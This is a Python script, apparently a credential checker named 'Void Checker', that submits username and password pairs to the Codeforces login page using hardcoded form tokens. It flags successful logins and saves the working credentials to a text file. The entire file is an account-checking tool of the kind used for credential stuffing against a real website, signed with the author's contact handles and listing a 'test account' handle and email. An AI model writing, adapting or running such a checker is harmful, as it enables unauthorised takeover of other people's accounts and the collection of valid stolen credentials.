import requests
from colorama import Fore 

# Coded and Developed by TheSadError : thesaderror#4018

def vcodeforces(username,password):
        jsn = {
                "csrf_token": "5e532d82849143636bf43133aa3972f3",
                "action": "enter",
                "ftaa": "8ebdehow5ip6u3l5i1",
                "bfaa": "2170779b08fa87140e505bc707c78f4d",
                "handleOrEmail": username,
                "password": password
        }
        req = requests.post("https://codeforces.com/enter", data=jsn)


        f = open("save.html","w")

        txt = req.text
        hsour = str(txt.encode('utf-8'))
        f.write(hsour)
        #print(req.status_code)

        if "Invalid handle/email or password" in hsour:
                print(Fore.RED+f"{Fore.BLUE}[!]{Fore.RED} Invalid handle/email or password --> Username : [{username}] Password : [{password}]")
        else:
                print(Fore.BLUE+f"""
{Fore.GREEN}[+]{Fore.RED} Login Success --> {Fore.GREEN}Username :[{username}] Password : [{password}]
                

{Fore.WHITE}- Copright Coded and Developed by TheSadError !Void Checker!
                """)
                save =  open("Save.txt" , "w")
                save.write(f"""
[+] Login Success --> Username :[{username}] Password : [{password}]
                


- Copright Coded and Developed by TheSadError !Void Checker!
                """)


# Test Accounts : 


"""
hiwecaj674
hiwecaj674@offsala.com
"""

"""
# TheSadError
### Github : https://github.com/TheSadError/
### Discord : thesaderror#4018

### TheSadError wont be sad soon... :) 
"""